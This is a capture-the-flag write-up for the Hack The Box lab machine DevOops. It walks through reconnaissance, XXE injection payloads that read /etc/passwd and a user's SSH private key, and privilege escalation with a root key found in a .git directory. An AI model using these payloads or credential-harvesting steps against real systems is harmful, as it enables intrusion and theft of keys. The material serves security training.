# Hack The Box: DevOops

**Difficulty:** Medium
**OS:** Linux

DevOops is a Medium-level Linux machine that highlights the dangers of improperly configured XML parsers and the consequences of leaving sensitive configuration files exposed. The initial compromise is achieved by exploiting an XML External Entity (XXE) vulnerability in an API endpoint designed to accept blog post uploads. Privilege escalation is straightforward, relying on the recovery of an SSH key from the command history of a system user.

---

## Reconnaissance

The assessment begins with a standard Nmap scan against the target to identify open ports and services.

```bash
nmap -p- --min-rate 10000 10.10.10.91
nmap -p 22,5000 -sCV 10.10.10.91
```

The scan identifies two open ports:
*   **Port 22:** SSH (OpenSSH 7.2p2 Ubuntu)
*   **Port 5000:** HTTP (Gunicorn)

Navigating to port 5000 in a web browser displays a simple, mostly static webpage. The visual content provides little interaction. To discover hidden functionality, we perform directory brute-forcing using a tool like `dirb`, `gobuster`, or `ffuf`.

```bash
dirb http://10.10.10.91:5000
```

The directory enumeration reveals an `/upload` endpoint. Accessing this endpoint presents an interface for uploading XML files. The page specifies that the uploaded XML must contain specific tags: `<Author>`, `<Subject>`, and `<Content>`.

## Web Exploitation & Initial Access

### Testing for XXE

The presence of an XML upload feature immediately suggests testing for XML External Entity (XXE) injection. An XXE vulnerability occurs when a weakly configured XML parser processes XML input containing references to external entities. This can allow an attacker to read local files, interact with internal network resources (SSRF), or cause Denial of Service.

We create a benign XML file matching the application's required structure to test the upload mechanism.

```xml
<post>
  <Author>Tester</Author>
  <Subject>Test Subject</Subject>
  <Content>Test Content</Content>
</post>
```

Uploading this file results in a success message: "Processed blog post". The application parses the XML but does not display the content back.

To test for XXE, we modify the XML payload to define an external entity pointing to a local system file, such as `/etc/passwd`. We then reference this entity within one of the parsed tags.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<post>
  <Author>Tester</Author>
  <Subject>Test Subject</Subject>
  <Content>&xxe;</Content>
</post>
```

Uploading this malicious XML file successfully returns the contents of the `/etc/passwd` file within the application's response or error message, confirming the XXE vulnerability.

### Extracting Credentials via XXE

Reviewing the `/etc/passwd` output reveals the presence of a user account named `roosa`. We can use the XXE vulnerability to further enumerate the system and search for SSH keys to gain shell access.

We modify the XML payload to attempt to read `roosa`'s SSH private key from the default location.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa" >]>
<post>
  <Author>Tester</Author>
  <Subject>Test Subject</Subject>
  <Content>&xxe;</Content>
</post>
```

The server response contains the RSA private key for the user `roosa`. We save this key to a local file on our attacking machine and set the correct permissions.

```bash
chmod 600 id_rsa
ssh -i id_rsa roosa@10.10.10.91
```

Authentication is successful, providing an interactive shell as the `roosa` user. The `user.txt` flag can be retrieved from the home directory.

## Privilege Escalation

Enumerating the system as `roosa` involves checking for common misconfigurations, `sudo` privileges, and exposed sensitive files.

Checking the shell history is a standard post-exploitation step, as administrators sometimes type passwords or sensitive commands directly into the shell.

```bash
cat ~/.bash_history
```

Reviewing `roosa`'s `.bash_history` reveals a series of commands related to SSH key generation and copying. The history shows a command where an SSH private key named `auth_key` was created or moved into the `.git` directory of the web application located in `roosa`'s workspace.

```bash
# Example history output
...
git commit -m "added key for root"
cp /path/to/key .git/auth_key
...
```

We navigate to the specified directory and locate the key file.

```bash
cd /home/roosa/work/blogfeed/.git/
cat auth_key
```

The file contains an RSA private key. The commit message in the history suggests this key is for the `root` user.

We attempt to use this key to authenticate directly via SSH as `root` to the localhost.

```bash
ssh -i auth_key root@127.0.0.1
```

The authentication is successful, and we obtain a root shell.

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

The machine is fully compromised, and the `root.txt` flag can be retrieved.
